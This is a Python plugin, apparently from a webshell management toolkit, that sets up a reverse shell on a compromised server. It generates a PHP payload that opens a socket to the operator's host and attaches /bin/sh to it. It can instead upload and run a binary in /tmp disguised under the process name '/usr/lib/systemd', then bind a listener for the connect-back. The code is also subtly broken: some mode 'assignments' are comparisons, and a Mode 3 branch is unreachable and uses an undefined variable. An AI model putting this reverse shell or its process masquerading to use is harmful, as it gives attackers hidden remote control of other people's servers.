from os import path
from threading import Thread

from libs.c64 import encrypt
from libs.config import alias, gget, color
from libs.myapp import delay_send, get_system_code, has_env, is_windows, send
from libs.reverse_client_bash import main as bind
from webshell_plugins.upload import run as upload


def get_php(ip, port):
    return f"""$sock = fsockopen("{ip}", {port});
$descriptorspec = array(
0 => $sock,
1 => $sock,
2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
"""


@alias(True, func_alias="rs", _type="SHELL", l="lhost", p="port", m="mode", f="fakename")
def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"):
    """
    reshell

    Bind a local port and wait for target connect back to get a full shell.

    eg: reshell {lhost} {port} {type=[python|upload]{1|2},default = 0 (Python:1 Not Python:2)} {(Only for Mode 2) fakename=/usr/lib/systemd}
    """
    if (is_windows(False) or is_windows()):
        print(color.red(f"Only for both system is linux."))
        return False
    try:
        port = int(port)
    except ValueError:
        port = 23333
    disable_func_list = gget("webshell.disable_functions", "webshell")
    MODE = 1
    print(color.yellow(f"Waring: You are using a testing command...."))
    print(color.yellow(f"        Please make sure Port {port} open...."))
    if (mode == 0):
        if (has_env("python")):
            print(color.green(f"Traget has python environment."))
            MODE == 1
        else:
            print(color.red(f"Traget has not python environment."))
            MODE == 2
    else:
        MODE = int(mode)

    if ("proc_open" in disable_func_list):
        print(color.red("proc_open is disabled... Try Mode 3"))
        return
    if (MODE == 1):
        print(color.yellow(f"Use Mode 1->python"))
        command = get_php(lhost, port)
    else:
        print(color.yellow(f"Use Mode 2->upload"))
        filename = encrypt(f"{lhost}-{port}")
        if not upload(path.join(gget("root_path"), "auxiliary", "reshell", "reverse_server_x86_64"), "/tmp/%s" % filename, True):
            return
        command = get_system_code(f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}", False)
    t = Thread(target=delay_send, args=(2, command))
    t.setDaemon(True)
    t.start()
    print(f"Bind port {color.yellow(str(port))}...")
    if (not bind(port, MODE)):
        print(color.red(f"Bind port error."))
    if (MODE == 3):
        res = send(f"unlink('/tmp/{filename}');")
        if (not res):
            return
